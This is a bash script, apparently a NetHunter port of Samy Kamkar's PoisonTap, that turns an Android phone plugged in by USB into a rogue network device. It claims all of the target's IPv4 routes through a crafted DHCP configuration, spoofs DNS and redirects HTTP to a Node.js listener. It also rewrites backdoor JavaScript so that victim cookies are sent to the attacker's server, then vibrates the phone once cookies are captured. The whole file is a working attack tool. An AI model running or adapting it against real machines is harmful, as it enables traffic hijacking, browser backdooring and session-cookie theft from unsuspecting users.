#!/bin/bash
#
# Originated by Samy Kamkar

# ================== #
# Define global variable
# ================== #
# Set nethunter path
nh_path="/data/local/nhsystem/kali-armhf"
# Shorten chroot command as we execute this script in android environment and sometimes we need to execute the program in Kali environmnet
chroot_nh="chroot $nh_path"
# Set your desired "network portion" address assigned to target here (without full stop at the end)
net_addr="1.0.0"
iface_addr="$net_addr.1"
# Timeout to stop this script when target not getting any ip address
countime=120
# Config your server ip here
myserverip=$iface_addr

# ================== #
# Define shutdown function
# ================== #
shutitdown(){
echo " [!] Bringing down $INTERFACE and revert the iptables"
pkill python
#$chroot_nh pkill Responder
$chroot_nh pkill sh
$chroot_nh pkill nodejs
$chroot_nh pkill dhcpd
$chroot_nh pkill dnsspoof
$chroot_nh pkill screen
echo 0 > /proc/sys/net/ipv4/ip_forward
# Revert iptables setting dumped from kernel log.

iptables -t nat -D PREROUTING -i $INTERFACE -p tcp --dport 80 -j REDIRECT --to-port 1337
# Bring down interface
ip link set $INTERFACE down
ip addr flush dev $INTERFACE
exit
}

# ================== #
# Dependency checks
# ================== #
# dependency check function
dep_check(){
DEPS=(python git python-pip python-dev screen sqlite3 python-crypto nodejs isc-dhcp-server isc-dhcp-common)
for i in "${DEPS[@]}"
do
  PKG_OK=$($chroot_nh /usr/bin/dpkg-query -W --showformat='${Status}\n' ${i}|grep "install ok installed")
  echo " [+] Checking for installed dependency: ${i}"
  if [ "" == "$PKG_OK" ]; then
    echo " [-] Missing dependency: ${i}"
    echo " [+] Attempting to install...."
    $chroot_nh /usr/bin/sudo apt-get -y install ${i}
  fi
done

if [ ! -d "$nh_path/root/poisontap" ]; then
    echo " [+] Downloading poisontap..."
    $chroot_nh /usr/bin/git clone https://github.com/samyk/poisontap /root/poisontap
fi

if [ ! -s "$nh_path/usr/sbin/dnsspoof" ]; then
    echo " [-] dnsspoof program not found...Please make sure you have it installed under the folder \"/usr/sbin/\""
    exit()
fi

if [ ! -s "$nh_path/root/poisontap/backdoor.html" ]; then
    echo " [-] backdoor.html not found in /root/poisontap/...Please make sure you have poisontap cloned and files placed under the poisontap folder"
    exit()
fi

if [ ! -s "$nh_path/root/poisontap/target_backdoor.js" ]; then
    echo " [-] target_backdoor.js not found in /root/poisontap/...Please make sure you have poisontap cloned and files placed under the poisontap folder"
    exit()
fi
}

# ================== #
# Check required tools in Android and Kali environment
# ================== #
dep_check
if ! busybox ls > /dev/null;then
    echo No busybox found
    exit 1
fi
if ! iptables -V;then
    echo iptables not found
    exit 1
fi

# ================== #
# Make sure Wifi and Cellular data is disable
# ================== #
if [ "$(ifconfig wlan0 | grep inet)" ]; then
    echo " [!] Wifi is running, shuting it down! "
    svc wifi disable
    sleep 1
    echo " [+] Wifi is down!"
elif [ "$(ifconfig rmnet_data0 | grep inet)" ]; then
    echo " [!] Mobile data is running, shuting it down! "
    svc data disable
    sleep 1
    echo " [+] Mobile data is down!"
fi

# ================== #
# Check if usb state is setup correctly before moving forward.
# ================== #
if [ "$(getprop sys.usb.state | grep win)" != "" ] && [ "$(getprop sys.usb.state | grep rndis)" != "" ]; then
    INTERFACE=rndis0
elif [ "$(getprop sys.usb.state | grep mac)" != "" ] && [ "$(getprop sys.usb.state | grep ecm)" != "" ]; then
    INTERFACE=usb0
else
    echo " [-] Usb state is not configured properly, please check again."
    exit
fi

# ================== #
# Bring up interface and setup iptables
# ================== #
ip link set $INTERFACE down
ip addr flush dev $INTERFACE
ip addr add $iface_addr/1 dev $INTERFACE
ip link set $INTERFACE up
ip route add 0.0.0.0/0 dev $INTERFACE
## Very important command to allow internet access for target.
#ip route append $net_addr.0/1 dev $INTERFACE src $iface_addr proto kernel scope link table $UPSTREAM
# Catch the interrupt signal and run the shutdown script
trap shutitdown INT
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -i $INTERFACE -p tcp --dport 80 -j REDIRECT --to-port 1337
# ================== #
# Remove all previous leases, pid, conf and Responder.db
# ================== #
echo " [!] Remove previous stored previous leases, pid, conf and log"
if [ -s $nh_path/var/lib/dhcp/dhcpd.leases ]; then
    rm -f $nh_path/var/lib/dhcp/dhcpd.leases
fi
if [ -s $nh_path/run/dhcpd.pid ]; then
    rm $nh_path/run/dhcpd.pid
fi
if [ -s $nh_path/root/poisontap.conf ]; then
    rm $nh_path/root/poisontap.conf
fi
if [ -s $nh_path/root/poisontap/poisontap.cookies.log ]; then
    rm $nh_path/root/poisontap/poisontap.cookies.log
fi

# Recreate leases file
touch $nh_path/var/lib/dhcp/dhcpd.leases

# ================== #
# Create custom dhcpd.conf
# ================== #
cat << EOF > $nh_path/root/poisontap.conf
# notes below
ddns-update-style none;
default-lease-time 600;
max-lease-time 7200;
authoritative;
log-facility local7;
#option local-proxy-config code 252 = text;
# describe the codes used for injecting static routes
option classless-routes code 121 = array of unsigned integer 8;
option classless-routes-win code 249 = array of unsigned integer 8;
# A netmask of 128 will work across all platforms
# A way to cover /0 is to use a short lease.
# As soon as the lease expires and client sends a
# new DHCPREQUEST, you can DHCPOFFER the other half.
subnet 0.0.0.0 netmask 128.0.0.0 {
	range $net_addr.10 $net_addr.50;
	option broadcast-address 255.255.255.255;
	option routers $iface_addr;
	default-lease-time 600;
	max-lease-time 7200;
	option domain-name "local";
	option domain-name-servers $iface_addr;
	#option domain-name-servers $(getprop net.dns1);
# send the routes for both the top and bottom of the IPv4 address space
    option classless-routes 1,0, 1,0,0,1,  1,128, 1,0,0,1;
    option classless-routes-win 1,0, 1,0,0,1,  1,128, 1,0,0,1;
    #option local-proxy-config "http://$iface_addr/wpad.dat";
}
EOF
# ================== #
# Create a log file for screen program
# ================== #
echo " [+] Creating SCREEN logger"
cat << EOF > $nh_path/root/.screenrc
deflog on
logfile /root/logs/screenlog_$USER_.%H.%n.%Y%m%d-%0c:%s.%t.log
EOF
mkdir -p $nh_path/root/logs

# ================== #
# Start dhcpd
# ================== #
$chroot_nh /usr/sbin/dhcpd -cf /root/poisontap.conf -s $iface_addr

# ================== #
# Change listening server IP
# ================== #
echo " [+] Setting server IP: $myserverip"
sed -i "20c var socket = new WebSocket('ws://$myserverip:1337');" $nh_path/root/poisontap/backdoor.html
sed -i "4c new Image().src='http://$myserverip/poisontap/log.php?log='+document.cookies;" $nh_path/root/poisontap/target_backdoor.js

# ================== #
# Start dnsspoof and nodejs program on Kali environment
# ================== #
echo " [+] Starting 'dnsspoof' & 'nodejs' on Kali environment"
$chroot_nh /usr/bin/screen -dmS dnsspoof /usr/sbin/dnsspoof -i $INTERFACE port 53
$chroot_nh /usr/bin/screen -dmS node /usr/bin/nodejs /root/poisontap/pi_poisontap.js

# ================== #
# Get target's IP and PC name
# ================== #
# loop over the lease file to see if target has been given the ip address and internet access.
while true; do
    echo " [!] Assigning address to target, timeout: $countime"
    target_addr=$(cat $nh_path/var/lib/dhcp/dhcpd.leases | grep "lease $net_addr" | awk 'NR==1{print $2}');
    if [ -z "$target_addr" ]; then
        if [ "$countime" -eq "0" ]; then  ## breaks loop if it takes more than x seconds
            echo " [-] No ip address is assigned to the target."
            shutitdown
            echo " [-] Exit."
            exit
        fi
        sleep 1
        ((countime--))
        echo -ne "\033[1A"
        echo -ne "\033[K"
    else
        echo " [+] Target ip address: $target_addr"
        target_pc_name=$(cat $nh_path/var/lib/dhcp/dhcpd.leases | grep "client-hostname" | awk 'NR==1{print $2}' | tr -d "\"\;")
        echo " [+] Target PC name: $target_pc_name"
        break
    fi
done

# ================== #
# Capturing cookie and notify attackers via vibration once we have the first cookie captured
# ================== #
while true; do
if [ $(find /data/local/nhsystem/kali-armhf/root/poisontap/poisontap.cookies.log -type f -size +74c 2>/dev/null) ]; then
    echo 500 > /sys/devices/virtual/timed_output/vibrator/enable
    echo " [+] You got some cookies!!"
    echo " [+] Press Enter to stop capturing."
    read
    break
fi
sleep 1
done
# SHUT IT DOWN and Revert everything